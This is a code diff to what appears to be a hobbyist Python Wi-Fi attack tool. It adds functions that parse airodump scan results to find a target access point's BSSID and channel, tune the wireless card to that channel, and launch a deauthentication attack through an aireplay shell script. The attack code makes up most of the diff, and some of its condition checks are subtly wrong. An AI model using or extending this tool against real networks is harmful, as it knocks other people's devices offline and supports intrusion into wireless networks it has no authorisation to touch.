@@ -8,8 +8,10 @@ import time
 import csv
 import pandas as pd
 
-
-
+#variables
+bssid_of_targetAP = 'not found'
+channel_of_targetAP = 'not found'
+terminals = ['x-terminal-emulator','gnome-terminal','konsole','xfce4-terminal']
 
 def clear():
     subprocess.run('clear')
@@ -80,4 +82,65 @@ def scan_for_networks_by_OUI(interface):
 
 def scan_for_networks_by_OUI(interface):
     subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'],shell=True)
-    return input('Write the Network name of the target AP')
+
+def scan_for_networks_by_OUI_Select_Router(interface):
+    subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'],shell=True)
+    return input('Write the OUI of target Router')
+
+
+def retrieve_info_from_latest_networks_csv_file():
+    for filename in os.listdir('/tmp/'):
+        if filename.startswith('networks-') and filename.endswith('.csv'):
+            latest_file = max([f for f in os.listdir('/tmp/') if 'networks-' in f], key=lambda f: os.path.getctime(os.path.join('/tmp/',f)))
+            return '/tmp/'+latest_file
+
+def retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP):
+    global bssid_of_targetAP
+    global channel_of_targetAP
+    reader = csv.reader(open(networks_csv_file,'r'))
+    for row in reader:
+        # the output of airodump is 15 columns in csv file
+        # 0. column is BSSID
+        # 3. column is Channel
+        # 13. column is ESSID aka targetAP
+        # indexes are starting from 0
+
+        # we need channel and BSSID from here
+        ESSID_column_index = len(row) -2
+        if ESSID_column_index >=0 and row[ESSID_column_index].strip() == targetAP:
+            # target information is stored in the row[] variable for now and if we want the channel, BSSID we have to return their indexes mentioned above
+            if (row[0] or row[3]) != '':
+                bssid_of_targetAP = row[0].strip()
+                channel_of_targetAP = row[3].strip()
+
+
+def Deauth(interface,targetAP):
+    global bssid_of_targetAP
+    global channel_of_targetAP
+    print('Gathering information on'+' '+targetAP)
+    networks_csv_file = retrieve_info_from_latest_networks_csv_file()
+    # bssid_of_targetAP, channel_of_targetAP = retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP)
+    # turns out decalring multiple variables using a return statement is not avaliable in python although there is a workaround by creating another function...
+    # i found it easier to mkae these variables global so i can declare them inside the method and call here
+    retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP)
+    if (bssid_of_targetAP or channel_of_targetAP) == 'not found':
+        print(targetAP + ' has no BSSID or Channel information cannot continue further' + ' check /tmp/networks-*.csv')
+    else:
+        clear()
+        print('Target BSSID found : ' + bssid_of_targetAP)
+        print('Target Channel found : ' + channel_of_targetAP)
+        print('Switching interface: ' + interface + ' to channel: ' + channel_of_targetAP)
+        switch_channel = ['iwconfig '+interface+' channel '+channel_of_targetAP]
+        subprocess.Popen(switch_channel, shell=True)
+
+        print('Starting Deauthentication Attack')
+        global terminals
+        for terminal in terminals:
+            try:
+                # to execute aireplay in new terminal im sending variables to './ShellScripts/aireplay.sh'
+                subprocess.run([terminal,'-e ./ShellScripts/aireplay.sh',bssid_of_targetAP,interface]) # just so you know shell=True breaks the use of sudo and wont allow this script to run for who knows why
+                break
+            except FileNotFoundError:
+                print('no compatible terminal found: install ' + terminal)
+
+
